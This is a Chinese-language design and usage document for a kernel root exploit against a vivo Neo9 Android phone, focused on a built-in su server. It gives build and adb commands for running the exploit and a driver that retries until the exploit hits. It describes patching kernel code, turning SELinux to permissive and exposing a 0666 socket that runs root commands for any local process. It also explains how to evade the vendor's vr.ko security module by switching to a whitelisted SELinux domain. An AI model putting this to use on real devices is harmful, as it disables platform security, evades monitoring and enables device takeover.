# 内置 su（不依赖 rootc + rootd 文件队列）

> 2026-09-25。改动对象：`neo9-root/exploit/exploit_vivo.c`（稳定性层 v2 之上）。
> 参考实现：`archive/rootd.c`（socket 命令服务）、`client/rootc.c`（b64 命令客户端）、
> `client/u0.c`（setuid(0) 真 root）、`client/su`（su(1) 兼容 CLI）。
>
> ⚠️ **路径变更（2026-09-27）**：本文里出现的 `client/rootc.c` / `client/shim.*` /
> `client/su` / `client/su_builtin.sh` 都已归档到 **`neo9-root/archive/old-client/`**
> （老 rootd 链路整体退役）。**`client/u0.c` 没有动**，仍在原处 —— 它还活着
> （「激活 KSU」要 `u0 ksud insmod`）。下文按写就时的路径叙述，作为设计对照保留。

---

## 0. 一句话

root 通道从"**rootc 写文件 → rootd 轮询执行 → 写回输出**"（两个额外进程 + 轮询延迟）
改成"**exploit 本进程开 AF_UNIX 命令服务 + 同一个二进制做 su 客户端**"，
协议与语义（b64 命令、`[rc=N]`、u0 真 root、退出码透传）与老流程一致。

> **`su` 默认就是 uid=0**（自动走 §11 的 u0 流程，vr.ko 未中和也可用）。
> 要退回 caps 模式加 `--caps`，或 `CHEESE_SU_U0=0`；详见 §12。

---

## 1. 为什么能直接开服务（能力前提）

| 前提 | 由谁保证 |
|---|---|
| 进程持有全 caps（`0x1fffffffff`） | vhangup stub `STUB_MODE=10/13`（写 fsuid/fsgid=0 + 5 个 cap 字段） |
| **exec 后 caps 不被清空** | `CHEESE_PATCH_CAP=1` patch `cap_bprm_creds_from_file` → `mov w0,#0; ret` |
| euid 保持 2000（不被 vr.ko 击杀） | stub 只改 fsuid/caps，不动 euid |
| SELinux 不拦 | exploit 已把 `selinux_state.enforcing` 置 0 |
| 大块内存/GPU 不再被抱着 | 稳定性层的 `stab_gpu_release()`（提权后即撤窗口/销毁 kgsl ctx/关 fd/munmap 6GB） |

所以服务端不需要 rootd 的"chown 0:0 + chmod 04755 + re-exec"自提升那一步。

---

## 2. 用法

```sh
# 构建 (Windows/WSL, NDK r29)
bash neo9-root/exploit/build_exploit_stable.sh
#   -> exploit_vivo_neo9_stable_su_ndk13   ★ 内置 su 版

# 设备端: 冷窗口内跑 exploit (CHEESE_SU_DEFAULT 构建不需要 CHEESE_SU=1)
VER=PD2338_A_15.1.14.7.W10.V000L1
adb push neo9-root/exploit/out/$VER/exploit_vivo_neo9_stable_su_ndk13 /data/local/tmp/
adb shell "cd /data/local/tmp && CHEESE_STEXT_PA=0xa8010000 CHEESE_PATCH_CAP=1 \
  nohup ./exploit_vivo_neo9_stable_su_ndk13 > su.log 2>&1 &"

# 等日志出现: [su] 内置 su 服务已就绪: /data/local/tmp/su.sock
```

```sh
# 客户端 = 同一个二进制 (不需要 adb push 额外的 su)
/data/local/tmp/exploit_vivo_neo9_stable_su_ndk13 --su --ping
/data/local/tmp/exploit_vivo_neo9_stable_su_ndk13 --su --id
/data/local/tmp/exploit_vivo_neo9_stable_su_ndk13 --su -c 'id; getenforce; cat /proc/self/status | grep CapEff'
/data/local/tmp/exploit_vivo_neo9_stable_su_ndk13 --su                 # 交互 shell (pty)
/data/local/tmp/exploit_vivo_neo9_stable_su_ndk13 --su --u0 -c 'id'    # 真 root (euid=0)
```

也可以做成熟悉的 `su`：

```sh
adb push neo9-root/client/su_builtin.sh /data/local/tmp/su
adb shell chmod 755 /data/local/tmp/su
adb shell "cd /data/local/tmp && ln -sf exploit_vivo_neo9_stable_su_ndk13 exploit_su"
# 之后:  /data/local/tmp/su -c 'id'        /data/local/tmp/su         /data/local/tmp/su --u0 -c id
# 或:    ln -sf /data/local/tmp/exploit_vivo_neo9_stable_su_ndk13 /data/local/tmp/su
#        (argv[0] 名为 su 时, 二进制自动进入客户端角色, 连 --su 都不用写)
```

### 反复试到命中（GPU spray 是概率性的）

一次进程内跑完 44 个候选仍可能全灭，所以用驱动脚本代替手动重试：

```sh
# 默认: 先重启拿冷窗口 -> 最多 4 次; 每次未命中(且设备未重启)则主动重启再试
python3 neo9-root/scripts/run_su_until_root.py --serial <SERIAL> --attempts 4

# 只做环境自检 + 推送, 不跑 exploit
python3 neo9-root/scripts/run_su_until_root.py --dry-run

# 离线验证驱动本身的判定逻辑 (mock adb, 5 个场景)
python3 neo9-root/scripts/test_run_su_driver.py
```

三种结局分开判定，**不会把"没命中"当成"已 root"**：

| 结局 | 判据 | 处理 |
|---|---|---|
| HIT | 日志出现 `[su] 内置 su 服务已就绪` / `root ready (caps mode` | 立刻验证 `--ping` / `--id` / `-c 'id'`，退出 0 |
| MISS_NO_REBOOT | 日志出现 `All attempts failed` / `phyaddr sweep exhausted` | 主动重启刷新内存布局后重试 |
| MISS_REBOOT | adb 掉线回来后 `boot_id` 变化（真机常见） | 等回到 `boot_completed=1` 后重试 |
| TIMEOUT | 超时无结论 | **不算命中**，按未命中处理 |

> 在容器/沙箱里跑 adb 时：**不要 `adb kill-server`** —— 沙箱内没有 `/dev/bus/usb`，
> 自己起的 server 看不到设备；直接复用宿主机上已在运行的 adb server（127.0.0.1:5037）即可。

### 客户端选项（与 `client/su` 对齐）

| 选项 | 说明 |
|---|---|
| `-c, --command CMD` | 执行命令（`-c` 之后的所有参数拼成一条命令，同 `cmd="$*"`） |
| `CMD...` | 位置参数同样拼接执行 |
| `--u0, -0` | 真 root（服务端子进程 `setgid(0)+setuid(0)` 后 exec） |
| `-s, --shell SHELL` | 指定 shell（默认 `/system/bin/sh`） |
| `--no-path` | 不注入 `export PATH=<dir>:$PATH;`（默认注入，便于直接用 `busybox` 等） |
| `--sock PATH` | 指定 socket（默认 `$ROOTD_DIR/su.sock`） |
| `--id` / `--ping` | 身份+caps 报告 / 存活探测 |
| `-l, --login, -` / `-m,-p` | 兼容 su，忽略 |
| 无参数 | 交互 shell（pty，见 §5） |

退出码 = 被执行命令的退出码（解析服务端响应尾部的 `[rc=N]`）。

---

## 3. 与老流程对照

| 维度 | rootc + rootd（文件队列） | 内置 su（本次） |
|---|---|---|
| 常驻进程 | exploit + rootd（chown 04755 自提升再 exec） | 只有 exploit 自身 |
| 客户端 | 额外 push `rootc` 二进制 | 同一个 exploit 二进制（`--su`） |
| 传输 | `rootd_cmd`/`rootd_out` 文件 + 100ms 轮询 + 30s 超时 | AF_UNIX SOCK_STREAM 直连 |
| 输出延迟 | 轮询粒度（≥100ms） | 近实时流式 |
| 交互 shell | `su` 脚本逐行喂命令（无 pty，行编辑/CCtrl-C 不可用） | **pty 真交互**（提示符、Ctrl-C、窗口大小） |
| 命令编码 | b64（避开引号） | 同样 b64（沿用 rootc v3 语义） |
| 退出码 | 输出里带 `[rc=N]`，脚本不解析 | 客户端**解析并透传**为进程退出码 |
| u0 真 root | 依赖外部 `u0` 二进制 | 内置 `setuid(0)`（`EXEC0`/`--u0`） |
| 并发命令 | 单文件队列，天然串行 | 每连接一进程，可并发 |
| 兼容性 | — | **默认同时 fork 一份文件队列服务**，`rootc` 老脚本继续可用 |

---

## 4. 协议

服务端 `<ROOTD_DIR>/su.sock`（0666），**一次连接一条命令，响应后关闭**（与 rootc 语义一致）。
所有请求以 `\n` 结束；`base64` token 不含空格，故按空格切词安全。

| 请求 | 响应 |
|---|---|
| `PING` | `PONG\n[rc=0]\n` |
| `ID` | `pid= uid= euid= fsuid= gid=` + `CapEff/CapPrm/Secbits/NoNewPrivs` 行 + `[rc=0]\n` |
| `EXEC <flagshex> <b64shell\|-> <b64cmd>` | 子进程 stdout/stderr 流 + `\n[rc=N]\n` |
| `SHELL <rows> <cols> [b64shell]` | pty 原始字节流 + `\n[rc=N]\n` |

`flags` bit0 = 子进程先 `setgid(0)+setuid(0)`（u0 语义）。
服务端子进程执行形态：`fork` → `dup2(conn,1/2)`、stdin=`/dev/null` → `execl(shell,"sh","-c",cmd)`。

就绪标记：`su_ready.txt`（含 socket 路径与 uid）+ `rootd_ready.txt`（兼容老脚本的等待逻辑）。

---

## 5. 交互 shell 的两档

1. **pty 档（默认）**：服务端 `posix_openpt` + `setsid` + `TIOCSCTTY` 起 `sh -i`，
   客户端 `poll` 双向转发 stdin/socket，并把客户端终端窗口大小通过 `SHELL <rows> <cols>` 下发。
   好处：真提示符、Ctrl-C 生效、`top`/`vi` 这类全屏程序可用。
2. **逐行档（降级）**：若服务端回 `su: pty 不可用`（例如 `/dev/ptmx` 被拒），
   客户端自动退化为"每读一行发一条 `EXEC`"，与老 `su` 脚本行为一致。

---

## 6. 环境变量

| 变量 | 默认 | 作用 |
|---|---|---|
| `CHEESE_SU` | `0` | `=1` 启用内置 su（`-DCHEESE_SU_DEFAULT=1` 构建则恒开，无需设置） |
| `CHEESE_SU_SOCK` | `$ROOTD_DIR/su.sock` | socket 路径 |
| `CHEESE_SU_QUEUE` | `1` | 同时 fork 文件队列兼容服务（`rootc` 仍可用）；`=0` 关闭 |
| `SU_EXPLOIT` | — | 包装脚本 `client/su_builtin.sh` 指定的 exploit 路径 |

---

## 7. 与稳定性层的衔接（顺序很重要）

```
patch vhangup / cap_bprm / kptr
  → 本进程 syscall(58) 触发 stub            # 不 fork
  → 打印 CapEff/Secbits 功能性验证
  → 按需还原 / 关守卫登记
  → stab_gpu_release(): 撤 fast_rw → 销毁 kgsl ctx → 关 fd → munmap spray → 落 GPU 硬闸门
  → [CHEESE_SETTLE_MS 收敛等待]
  → stab_su_server():  开 socket 服务
       └─ fork 文件队列兼容服务 (可选)
```

**服务端所有 fork 都发生在 GPU 释放之后**：不再有"子进程退出 → kgsl release → 父进程
通道死亡 → 仍在灌命令 → PANIC"的路径（见 `STABILITY_V2.md` 的 fork 三条死法）。
服务端入口还有一道保险：若 `g_gpu_disabled` 未置位，先强制 `stab_gpu_release()` 再开服务。

服务端自身对信号的处理：忽略 `SIGHUP`（adb shell 退出不影响）与 `SIGPIPE`，
其余（INT/TERM/SEGV/BUS/ILL/ABRT/ALRM）恢复默认 —— 即服务期不再依赖 patch 窗口的
"应急还原"（那时补丁已是刻意保留的）。

---

## 8. 安全模型与风险

1. **默认不是 euid=0**。`su -c id` 显示 `uid=2000 euid=2000 fsuid=0` + `CapEff=000001ffffffffff`：
   DAC/文件/系统调用全能力，但 `euid != 0` —— 这是为规避 vr.ko（检测 `euid==0` 且非 vrp 域即击杀）而刻意设计的。
   `ps` 里看到 uid 2000 属正常。
2. **`--u0` 是 euid=0，会被 vr.ko 盯上**。vr.ko 的 kprobe 挂在 `avc_has_perm` 等路径上，
   uid 0 进程触发的 SELinux 检查会命中检测函数 → `force_sig` 击杀 → 系统进程连锁崩溃。
   仅在 **vrpatch.ko 已加载中和 vr.ko** 后使用（KSUOneTap 流程第 [3] 步之后）。
3. **socket 0666 = 本机任意 uid 可请求 root 命令**。这与 rootd 的 `rootd_cmd` 0666 文件队列同级。
   SELinux 已 permissive，所以不再有额外的域隔离兜底。
   需要收紧时：`CHOWN`/`chmod` 到特定组，或用 `CHEESE_SU_SOCK` 指向私有目录（app 场景）。
4. **服务进程被 SIGKILL 后，socket 文件残留**（下次启动会 `unlink` 重建）。
5. **命令仍以 euid=2000 的子进程执行**：`su -c 'cat /proc/kallsyms'` 这类
   "vivo 额外校验真实 uid" 的接口仍需要 `--u0`。

---

## 9. 整机影响面（"会不会破坏系统"）

**结论：不会破坏系统盘 / 不会变砖 / 不丢数据。** 依据分三层，前两层是代码实证，第三层是既有真机数据。

### 9.1 落盘面（代码实证）

二进制里对 `grep -nE "/dev/block|by-name|apanic|/dev/mem|/dev/kmem"` **零命中** —— 不碰分区表、
不做块设备写、不读裸内存设备。全部可写落点只有 6 处，且都在 `ROOTD_DIR`（默认 `/data/local/tmp`）：

| 路径 | 用途 | 权限 |
|---|---|---|
| `su.sock` | 内置 su 服务 socket | 0666（见 §8.3） |
| `su_ready.txt` / `rootd_ready.txt` | 就绪标记 | 0666 |
| `rootd_out` | 文件队列兼容服务的输出 | 0666 |
| `.cheese_stab_backup.bin` | 原始指令 sidecar（还原用） | 0600 |
| `.cheese_test.lock` | 单实例锁 | 0600 |
| `/proc/self/oom_score_adj` | 防 LMK（写 `-1000`） | — |

内核侧的改动全在 RAM（`.text` stub、`cap_bprm`、`kptr_restrict`、`selinux_state`），**重启归零**；
不动 boot/vbmeta/erofs → 与 BL 熔断、变砖无关。

### 9.2 su 相对 v1（rootc + rootd）多做了什么

**没有新增任何内核写**。反而少了两样更敏感的东西：

- v1 的 `rootd` 要 `chown 0:0` + `chmod 04755` 自提升（往 `/data/local/tmp` 写一个 setuid-root 文件），
  内置 su 不需要这一步（本进程已持 caps + `cap_bprm` 已 patch）；
- v1 的父进程会长期抱着 6GB spray 与劫持态 kgsl context，内置 su 走单进程模式，**提权完即释放**。

### 9.3 真实副作用（按严重度，前两条与 su 无关）

| # | 副作用 | 是否 su 引入 | 影响 | 恢复 |
|---|---|---|---|---|
| 1 | **SELinux 全局 permissive**（`selinux_state.enforcing=0`） | ❌ v1 就有 | 整机失去强制访问控制，其它 app 一并受益 | 重启 |
| 2 | **`cap_bprm` 补丁的全局语义** | ❌ v1 就有 | 持 caps 的进程 exec 后不再被清 caps → 软重启时 zygote/netd 崩 | `unpatch.ko` / 重启 |
| 3 | **`--u0`（euid=0）曾被认为会触发 vr.ko 击杀** | ✅ su 新增 | **2026-09-26 复测修正**：带 `setcon` 白名单域后，`--u0` 连打 5 次均 `uid=0` 成功，dmesg 里 vr.ko 的 `fatal`/落盘取证痕迹 **0 条**，系统进程与 boot_id 全程未变。详见 §11 | 无需重启；风险边界见 §11.4 |
| 4 | socket 0666 本机任意 uid 可请求 root 命令 | ✅ su 新增 | 安全面（permissive 下无域隔离兜底） | `CHEESE_SU_SOCK` 指私有目录 / 收紧权限 |
| 5 | `su_ready.txt` 等在 `/data` 上不随重启消失 | ✅ su 新增 | 重启后未跑 exploit 时，客户端先等 10s 再报"连接失败"（不静默、不卡死） | 下次运行会 `unlink` 重建 |

### 9.4 操作纪律（比 su 本身重要）

- 默认用法（`--su` / `--su -c ...`，不加 `--u0`）**不会破坏系统**；最坏情形是内核 panic 后重启
  （内存态，无数据损失，见 `STABILITY_V2.md` §7）。
- **别在 vr.ko 未中和时用 `--u0`**；**软重启前先跑 `unpatch.ko` + `vrpatch.ko`**；
  同一次 boot 内避免反复重跑 exploit。
- 需要"真实 uid=0"的接口（`/proc/kallsyms`、`ksud`）才用 `--u0`；其余用默认 caps 模式即可
  （`fsuid=0` + 全 caps，DAC 视角就是 root）。

> ⚠️ 以上 §9.1/§9.2 是代码实证，§9.3 的第 3 条来自 `VRKO_BYPASS.md` 的既有真机数据。
> **§9.4 起为真机上机后的实测记录**（2026-09-26，第二次尝试命中）。

### 9.4 真机实测（2026-09-26，caps 模式，未用 `--u0`）

```
第 1 次: MISS_REBOOT (boot_id 变化, 106s)   ← 全部 44 候选扫完未命中, 设备自己重启
第 2 次: HIT (77s)  uptime=29s 冷窗口内
```

命中后逐项验证（全部通过）：

| 自检项 | 命令 | 实测 |
|---|---|---|
| A 服务就绪 | 日志 | `[su] 内置 su 服务已就绪: /data/local/tmp/su.sock (socket 0666)` |
| B 通道 | `--su --ping` | `PONG` / `[rc=0]` |
| C 身份 | `--su --id` | `uid=2000 euid=2000 fsuid=0`，`CapEff=000001ffffffffff`、`CapPrm` 同上 |
| D 执行 | `--su -c 'id; …'` | 执行成功，`context=u:r:kernel:s0`；`kptr_restrict=0` |
| D' 退出码 | `--su -c 'exit 42'` | 客户端透传 `rc=42`（老 rootc 不解析此项，脚本会静默当成功） |
| E pty | `--su` 喂 `echo PTY_OK_$((7*6))` | 提示符 + `PTY_OK_42` + `exit` → `[rc=0]` |
| G 兼容 | `ls /data/local/tmp` | `rootd_ready.txt` 在；日志有 `文件队列兼容服务已 fork (pid=14506)` |

**系统未受破坏（硬证据）**：netd(1533) / zygote64(1534) / system_server(2349) 全部是开机 PID，未被杀重启；
load average 11.7 → 1.66（spray 回收后回落）；MemAvailable 10.5 GB（6 GB spray 已归还）；
SELinux Permissive、`kptr_restrict=0`。`F 项 --u0` 按纪律**未测**（需先中和 vr.ko）。

## 10. 测试与验证

```sh
# 纯逻辑回归 (不需设备): b64 round-trip / 退出码解析 / argv 拼接
python3 neo9-root/exploit/test_su_protocol.py     # 21 组断言

# 产物校验 (需 NDK 的 llvm 工具; 构建脚本已自动调用)
python3 neo9-root/exploit/verify_bins.py
#   -> 架构/解释器/依赖库 + stub 机器码逐字节 + 偏移闸门 + su 协议字符串

# 反复尝试驱动的状态机回归 (mock adb, 不需设备): 6 个场景
python3 neo9-root/scripts/test_run_su_driver.py
```

真机自检（见 build 脚本输出末尾）：
`--ping` → `PONG`；`--id` → `fsuid=0` + `CapEff` 全开；`-c 'id; getenforce'` → caps 模式 + `Permissive`；
无参 → pty 交互；`--u0 -c id`（vr.ko 已中和时）→ `uid=0`；`rootc 'id'` 仍可用（兼容服务）。

> 驱动侧踩到的坑（已修 + 已固化为回归用例 ⑥）：设备端日志里混有非 UTF-8 字节
> （exploit 内部二进制 / `tail -c` 截断的多字节序列），Python 默认严格 utf-8 解码会抛
> `UnicodeDecodeError` —— 实测在判定出 HIT 之后崩掉，连 su 验证都没跑到。
> 修复：`Adb.run` 用 `encoding='utf-8', errors='replace'`，并把"日志尾部取证"整段包进
> try/except（取证失败不得影响判定）。

> `test_su_protocol.py` 在开发中真实抓到一个 bug：解码表把 `'='` 映射为 0 且未特判，
> 非 3 倍数长度的 base64 会多吐字节（长度不再等于原始长度）。已修，并把
> `embedded_root_daemon` 里那份重复解码器统一到同一个已测函数。

## 11. `--u0` 与 vr.ko 共存（白名单域路线）

> 2026-09-26 实机验证。目标：**在 vr.ko 未被中和的前提下**让 `uid=0` 可用（`/proc/vrp`、
> `/proc/kallsyms` 等需要 `current_euid()==0` 的接口），并顺带把 `su` 装到 `/data/local/tmp`。

### 11.1 原理

vr.ko 的检测条件（`VRKO_BYPASS.md` §1，逆向自检测函数 `.text+0x2ecc`）：

```
current->cred->euid == 0  &&  cred->security->sid != vrp 域(u:r:vrp:s0)
-> force_sig(SIGABRT) + 落盘取证
```

谓词先读 `cred+0x14`(euid)：`cbnz` 非 0 就直接返回，**只有 euid==0 才会去比对 sid**；
比对时它把 `u:r:vrp:s0` 当**白名单域**。所以 `--u0` 的做法是：

```c
setcon("u:r:vrp:s0")   // ① 先切域：此刻 euid 仍是 2000，谓词在 cbnz 处返回，暴露窗口为零
setgid(0); setuid(0)   // ② 再降 uid -> euid=0
setexeccon(...)        // ③ 钉 exec 落点（见 11.3，实测在此平台上不改变最终结果）
exec("/system/bin/sh", "-c", cmd)
```

**不需要知道 vrp 的数值 sid** —— 走 `/proc/self/attr/current` 写入，由内核完成
字符串→sid 转换（sid 随 policy / 每次 boot 变化）。`/sys/fs/selinux/context` 是 0666，
实测 `uid=2000` 无 caps 的 shell 也能 `setcon` 成功（前提是 SELinux 已 permissive，
本 exploit 默认会切）。

### 11.2 实机验证结果

| 项 | 结果 |
|---|---|
| `--u0 -c 'id'` | `uid=0(root) gid=0(root)` + 全 caps(`000001ffffffffff`) |
| `--u0` 连打 5 次 | 5/5 成功，无失败、无进程被杀 |
| `/proc/kallsyms` | 可读（`ffffffe7b9000000 T _text`）—— caps 模式做不到 |
| `/proc/vrp` | 仍 EPERM（其 open 处理器有主动检查，与 uid 无关） |
| 域 | `u:r:vrp:s0`（**无 exec 时**）；exec 后 → `u:r:kernel:s0`（见 11.3） |
| vr.ko | 仍加载（`/proc/modules` 有 `vr`） |
| dmesg / logcat | `fatal:` / `Raw_Dmp!` 痕迹 **0 条**（dmesg 可读，35088 行，负证据有效） |
| 系统 | netd(1533)/zygote64(1534)/system_server(2349) 全程未重启；boot_id 未变；uptime 连续 |

### 11.3 一个未解释透的现象（重要，别当结论用）

**`execve` 之后最终域不是 vrp，而是 `u:r:kernel:s0`（sid=1）。** 已隔离到最小：

| 序列 | 结果 |
|---|---|
| `setcon(vrp)`（不 exec） | vrp ✅ |
| `setcon(vrp)` → `setgid(0)` → `setuid(0)`（不 exec） | vrp ✅（setuid 不改域） |
| `setcon(vrp)` → `exec sh`，**uid=2000** | vrp ✅ |
| `setcon(vrp)` → `setuid(0)` → `exec sh`，**uid=0** | **kernel** ❌ |
| 同上 + `setexeccon(vrp)`（放 setuid 前） | kernel ❌ |
| 同上 + `setexeccon(vrp)`（放 setuid 后） | kernel ❌ |

即：**差异只由 `uid=0` 引起**，且 `exec_sid` 压不住。已确认 `exec_sid` 在 `setgid/setuid`
之后会丢（uid=2000 时 `setexeccon` 是有效的，uid=0 + setuid 后无效）。

`sid=1` 正是 `MODE=13` stub **写进 `cred->security->osid`** 的值，因此怀疑 exec 路径在
uid=0 时从 `osid` 重新派生了域 —— 但**未经证实**。

**两种竞争解释（都还没定论）：**
1. 文档里 `euid==0 && 非 vrp → 击杀` 是纯逆向推断，`DEBUG_RECORD.md` §12 把
   `MODE=0/2/5` 的崩溃归因于它，但那几种模式同时做了
   `commit_creds(prepare_kernel_cred(0))`（creds/user 完全替换），归因可能是错的
   —— 该文档自己对 `MODE=8` 就承认过"非 stub 问题"。
2. 谓词确实会触发，只是本场景（普通进程发起的 `avc_has_perm`）没走到 fatal 分支。

**要定论，需要在已 root 状态下做一件本环境做不到的事**：用 GPU 通道读回 exec 后进程的
`cred->security->sid`，看它到底是 1 还是 vrp 的数值；或改 `STUB_MODE=10`（不写 osid/sid）
重新 root 后对比。**在那之前，请把"euid=0 安全"当成实测事实、而不是已解释的机制。**

### 11.4 使用与风险边界

```sh
# u0 一次性特权命令 (euid=0, 全 caps)
/data/local/tmp/su --u0 -c 'id'
/data/local/tmp/su --u0 -c 'head -1 /proc/kallsyms'

# 显式指定本机白名单域 / 关闭域切换
CHEESE_U0_CTX=u:r:xxx:s0 /data/local/tmp/su --u0 -c 'id'
CHEESE_U0_CTX=off        /data/local/tmp/su --u0 -c 'id'   # 仅 vr.ko 已中和时用
```

- **安全闸门**：`setcon` 失败时**拒绝降 uid**（不会进入"euid=0 且域未知"的状态），
  命令以 rc=126 失败并打印处理方法。已验证：域名无效时刻意让它失败 → 进程保持 `uid=2000`。
- **不要用 `--u0` 加载内核模块**。文档记载的 vr.ko 触发器是
  `do_init_module`/`module_memfree`（"insmod → 设备重启"，**不看调用者 uid**）。
  KSU 激活仍走 caps 模式 + `vrpatch.ko` 那条链（`VRKO_BYPASS.md` §3）。
- 其余场景优先用默认 caps 模式（`fsuid=0` + 全 caps，DAC 视角即 root）；`--u0` 只在
  确实需要"真实 uid=0"时用。

### 11.5 把 `su` 装到 `/data/local/tmp`

服务端启动时自动安装（`CHEESE_SU_INSTALL=0` 可关，`copy` 可改成复制而非符号链接）：

```
[su] 已安装 /data/local/tmp/su -> 可直接 /data/local/tmp/su -c 'id'
```

- `su` 是**指向 exploit 二进制的符号链接**；客户端识别靠 `argv[0]` 的 basename
  （`stab_su_invoked_as_client`），该判定在 `main()` 最顶端、早于任何 GPU/漏洞逻辑，所以零成本。
- 幂等：已存在且指向本二进制就跳过；用户自己放的普通文件**不覆盖**。
- 也可手动装：`<exploit> --install-su`（纯用户态，不碰漏洞路径）。
- 诊断子命令：`<exploit> --setcon [ctx]`（只切域）、`<exploit> --u0test`（走 u0 同一条代码路径
  并逐步打印域、最后打 200 轮 avc 触发）。

## 12. `su` 默认 uid=0（不用再手写 `--u0`）

2026-09-26 改进。客户端默认带上 `STAB_SU_FLAG_U0`，所以设备上直接敲 `su` 就是 uid=0。

### 12.1 用法与退出开关

```sh
su -c 'id'                  # uid=0(root)  ← 默认
su id -u                    # 位置参数形式同样默认 u0
su                          # 交互 shell (pty)，也是 uid=0 + 域 u:r:vrp:s0
su --id                     # 报告"命令真正运行时"的身份 (子进程里套用 flags 后再报)

su --caps -c 'id'           # 退回 caps 模式 (euid 保持 2000)
CHEESE_SU_U0=0 su -c 'id'   # 同上 (环境变量)
CHEESE_SU_U0=0 su --u0 -c 'id'   # 命令行 --u0 覆盖环境变量
```

优先级：命令行 > `CHEESE_SU_U0` > 默认(u0)。

### 12.2 实机验证（permissive 阶段，即目标环境）

| 路径 | 结果 |
|---|---|
| `su -c 'id -u'` | `0` ✓ |
| `su --caps -c 'id -u'` | `2000` ✓ |
| `CHEESE_SU_U0=0 su -c 'id -u'` | `2000` ✓ |
| `su --id` | `uid=0 euid=0 fsuid=0`、`ctx=u:r:vrp:s0`、`CapEff` 全开 ✓ |
| `su`（pty 交互） | 提示符 + `id -u`→`0`、**域 `u:r:vrp:s0`** ✓ |
| 并发 | 一个 pty 会话挂着时，另一条 `su --id` 仍能立刻返回 ✓ |

注意 pty 路径的域 **保持 vrp**（EXEC 路径会回到 `u:r:kernel:s0`，见 §11.3）；也就是说
交互 shell 那条路上"白名单域"这个性质是完整成立的。

### 12.3 两个必须知道的坑（都是本轮实测踩出来的）

**(1) pty + u0 在 Enforcing + 审计洪泛的环境下会卡住。**

症状：客户端一直等、看不到提示符；服务端日志停在 `[u0] setcon 之前`。
定位过程：`stab_u0_enter()` 里逐步打点 → 卡点是 `write("/proc/self/attr/current")`
（即 `setcon`）。

| 环境 | `setcon` 行为 |
|---|---|
| Permissive（exploit 正常流程 / KSU 之前） | 正常返回，pty+u0 完全可用 |
| Enforcing + KSU + 内核日志洪泛（dmesg 大量 `Modules linked in:` 刷屏） | 长时间阻塞 |

判断是**环境性**而非代码缺陷：同一份代码在 permissive 下 pty+u0 一次通过。
推测 `setcon` → `flush_unauthorized_files()` / denial 审计路径被洪泛拖住。

对策（已实现，双保险）：
- 客户端 pty 探测改成**带超时**（默认 10s，`CHEESE_SU_PTY_TIMEOUT_MS` 可调），超时给出
  明确提示与三条退路（`-c` / `--caps` / `CHEESE_U0_CTX=off`），不再"看起来卡死"。
- 服务端改成**每连接一个子进程**（见 12.4），所以一个卡住的会话不再堵住后续所有 `su`。

**(2) 子进程里 `dup2(cfd,1)` 之后不能再往 `cfd` 写。**

`stab_su_exec` / `stab_su_identity` 的复查分支原本把已 `close` 的 `cfd` 继续传给
`stab_u0_enter()` / `stab_su_report_identity()`，写入全部落空 ——
表现就是 `--id` 只回一个空的 `[rc=0]`，以及 u0 被拒绝时看不到任何原因。
已统一改成写 **fd 1**（dup2 之后它就是那个 socket）。

### 12.4 服务端改成每连接一个子进程

原因：su 服务端本来是按"一次连接一条命令"**串行**处理的。pty 是长连接，
实测一个卡住的会话会让服务端**永久卡在 relay 里，连 accept 都回不去** ——
后续所有 `su` 调用全部无响应。现在 accept 后 fork 一个子进程处理该连接
（父进程只负责 accept + 回收僵尸），任何长会话/异常会话都只影响它自己。

### 12.5 诊断入口（换机型/排查时用）

```sh
# 已经拿到 root (例如 KSU) 时, 不必重新命中漏洞就能起一个新版服务端做验证
CHEESE_SU_SOCK=/data/local/tmp/su2.sock CHEESE_SU_QUEUE=0 CHEESE_SU_INSTALL=0 \
    nohup <exploit> --su-server >/data/local/tmp/su2.log 2>&1 &

# 单步诊断
<exploit> --setcon [ctx]     # 只切域
<exploit> --u0test           # 走 u0 同一条代码路径, 逐步打印域 + 打 200 轮 avc
CHEESE_SU_VERBOSE=1 <exploit> --su-server   # 打开 pty 子进程/u0 步骤的逐步日志
```
